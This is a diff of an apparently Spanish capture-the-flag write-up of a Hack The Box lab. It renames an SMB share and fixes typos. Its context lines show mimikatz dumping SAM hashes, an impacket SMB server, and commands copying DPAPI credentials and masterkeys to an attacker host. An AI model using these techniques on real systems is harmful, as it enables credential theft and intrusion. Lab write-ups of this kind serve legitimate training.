@@ -176,7 +176,7 @@ reverse proxy to https://10.13.38.16 listening at *:443.</span>
 <p class="plain-text">Ahora en la web hacemos que emita el <code class="language-plaintext highlighter-rouge">check</code> contra nuestra direccion <code class="language-plaintext highlighter-rouge">ip</code> de la vpn</p>
 <a href="/endgames/hades/4.png" target="_blank"><div><p><img src="/endgames/hades/4.png"></p></div></a>
 
-<p class="plain-text"><code class="language-plaintext highlighter-rouge">Mitdump</code> nos reporta varias cosas de la <code class="language-plaintext highlighter-rouge">petición</code> capturada entre ellas la cabecera <code class="language-plaintext highlighter-rouge">User-Agent</code> que es <code class="language-plaintext highlighter-rouge">curl/7.58.0</code>, la petición ha sido emitida desde un <code class="language-plaintext highlighter-rouge">comando</code></>
+<p class="plain-text"><code class="language-plaintext highlighter-rouge">Mitmdump</code> nos reporta varias cosas de la <code class="language-plaintext highlighter-rouge">petición</code> capturada entre ellas la cabecera <code class="language-plaintext highlighter-rouge">User-Agent</code> que es <code class="language-plaintext highlighter-rouge">curl/7.58.0</code>, la petición ha sido emitida desde un <code class="language-plaintext highlighter-rouge">comando</code></>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ sudo mitmdump</span><span class="p"> -p 443 --mode reverse:https://10.13.38.16 --ssl-insecure --set flow_detail=2  
 reverse proxy to https://10.13.38.16 listening at *:443.
@@ -800,11 +800,10 @@ PS C:\Users\pc1\Desktop></span>
 htb\administrator
 [dev.htb.local]: PS C:\Users\Administrator\Documents></span>
 </code></pre></div></div><br>
-<a href="/endgames/hades/9.png" target="_blank"><div><p><img src="/endgames/hades/9.png"></p></div></a>
 
 <p class="plain-text">Desde nuestro <code class="language-plaintext highlighter-rouge">linux</code> crearemos uns servicio <code class="language-plaintext highlighter-rouge">smb</code> con <code class="language-plaintext highlighter-rouge">smbserver</code> de <code class="language-plaintext highlighter-rouge">impacket</code> donde compartiremos el compilado de <a href="https://github.com/gentilkiwi/mimikatz">mimikatz.exe</a> dando soporte al <code class="language-plaintext highlighter-rouge">SMBv2</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ impacket-smbserver </span><span class="p">kali . -smb2support
+<code><span class="ve">❯ impacket-smbserver </span><span class="p">user . -smb2support
 Impacket v0.11.0 - Copyright 2023 Fortra
 
 [*] Config file parsed
@@ -817,7 +816,7 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 
 <p class="plain-text">En la sesión de <code class="language-plaintext highlighter-rouge">Administrator</code> en <code class="language-plaintext highlighter-rouge">dev.htb.local</code> nos copiamos el <code class="language-plaintext highlighter-rouge">mimikatz.exe</code> y lo usamos para dumpear la <code class="language-plaintext highlighter-rouge">sam</code> del equipo para poder ver los <code class="language-plaintext highlighter-rouge">hashes</code> NTLM</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">[dev.htb.local]: PS C:\Users\Administrator\Documents> </span><span class="am">cp</span><span class="p"> \\10.10.14.10\kali\mimikatz.exe .
+<code><span class="p">[dev.htb.local]: PS C:\Users\Administrator\Documents> </span><span class="am">cp</span><span class="p"> \\10.10.14.10\user\mimikatz.exe .
 [dev.htb.local]: PS C:\Users\Administrator\Documents> </span><span class="am">.\mimikatz.exe </span><span class="az">'token::elevate' 'lsadump::sam' </span><span class="p">exit
 
   .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
@@ -1061,7 +1060,7 @@ PS C:\Users\Administrator\Documents></span>
 
 <p class="plain-text">Iniciamos de nuevo un servicio <code class="language-plaintext highlighter-rouge">smb</code> para recibir todos esos <code class="language-plaintext highlighter-rouge">archivos</code> de la maquina</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ impacket-smbserver </span><span class="p">kali . -smb2support
+<code><span class="ve">❯ impacket-smbserver </span><span class="p">user . -smb2support
 Impacket v0.11.0 - Copyright 2023 Fortra
 
 [*] Config file parsed
@@ -1074,15 +1073,12 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 
 <p class="plain-text">Ahora copiamos las credenciales <code class="language-plaintext highlighter-rouge">dpapi</code> y las <code class="language-plaintext highlighter-rouge">masterkeys</code> a el recurso <code class="language-plaintext highlighter-rouge">smb</code> creado</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">cp </span><span class="p">C:\VSS\Users\Administrator\AppData\Roaming\Microsoft\Credentials\1A2572C793495F694F64823A392D4718 \\10.10.14.10\kali\1A2572C793495F694F64823A392D4718
-PS C:\Users\Administrator\Documents> </span><span class="am">cp </span><span class="p">C:\VSS\Users\Administrator\AppData\Roaming\Microsoft\Credentials\4A2EEB30EFC7958491B6578D9948EC7F \\10.10.14.10\kali\4A2EEB30EFC7958491B6578D9948EC7F
-PS C:\Users\Administrator\Documents> </span><span class="am">cp </span><span class="p">C:\VSS\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-4124311166-4116374192-336467615-500\87790867-a883-4a2d-a467-019c315e1104 \\10.10.14.10\kali\87790867-a883-4a2d-a467-019c315e1104  
-PS C:\Users\Administrator\Documents> </span><span class="am">cp </span><span class="p">C:\VSS\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-4124311166-4116374192-336467615-500\dc6059f1-5ba2-4186-871a-0ff4055a6875 \\10.10.14.10\kali\dc6059f1-5ba2-4186-871a-0ff4
+<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">cp </span><span class="p">C:\VSS\Users\Administrator\AppData\Roaming\Microsoft\Credentials\1A2572C793495F694F64823A392D4718 \\10.10.14.10\user\1A2572C793495F694F64823A392D4718
+PS C:\Users\Administrator\Documents> </span><span class="am">cp </span><span class="p">C:\VSS\Users\Administrator\AppData\Roaming\Microsoft\Credentials\4A2EEB30EFC7958491B6578D9948EC7F \\10.10.14.10\user\4A2EEB30EFC7958491B6578D9948EC7F
+PS C:\Users\Administrator\Documents> </span><span class="am">cp </span><span class="p">C:\VSS\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-4124311166-4116374192-336467615-500\87790867-a883-4a2d-a467-019c315e1104 \\10.10.14.10\user\87790867-a883-4a2d-a467-019c315e1104  
+PS C:\Users\Administrator\Documents> </span><span class="am">cp </span><span class="p">C:\VSS\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-4124311166-4116374192-336467615-500\dc6059f1-5ba2-4186-871a-0ff4055a6875 \\10.10.14.10\user\dc6059f1-5ba2-4186-871a-0ff4
 PS C:\Users\Administrator\Documents></span>
 </code></pre></div></div><br>
-
-<p class="plain-text">Una vez descargados los archivos para poder <code class="language-plaintext highlighter-rouge">decifrarlas</code> primero copiaremos las <code class="language-plaintext highlighter-rouge">credenciales</code> y las <code class="language-plaintext highlighter-rouge">masterkeys</code> a un <code class="language-plaintext highlighter-rouge">Windows</code> para poder correr el <code class="language-plaintext highlighter-rouge">mimikatz</code></p>
-<a href="/endgames/hades/11.png" target="_blank"><div><p><img src="/endgames/hades/11.png"></p></div></a>
 
 <p class="plain-text">Iniciaremos ingresando la <code class="language-plaintext highlighter-rouge">masterkey</code> indicando el <code class="language-plaintext highlighter-rouge">SID</code> que hemos visto de antes y tambien la <code class="language-plaintext highlighter-rouge">contraseña</code> de Administrator que hemos conseguido y decifrado con john</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
@@ -1712,7 +1708,7 @@ PS C:\Users\Administrator\Documents></span>
 
 <p class="plain-text">Finalmente como antes montamos un servidor <code class="language-plaintext highlighter-rouge">smb</code> donde vamos a copiar el archivo</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ impacket-smbserver </span><span class="p">kali . -smb2support
+<code><span class="ve">❯ impacket-smbserver </span><span class="p">user . -smb2support
 Impacket v0.11.0 - Copyright 2023 Fortra
 
 [*] Config file parsed
@@ -1724,7 +1720,7 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 </code></pre></div></div><br>
 
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">cp </span><span class="p">output.html \\10.10.14.10\kali\output.html  
+<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">cp </span><span class="p">output.html \\10.10.14.10\user\output.html  
 PS C:\Users\Administrator\Documents></span>
 </code></pre></div></div><br>
 
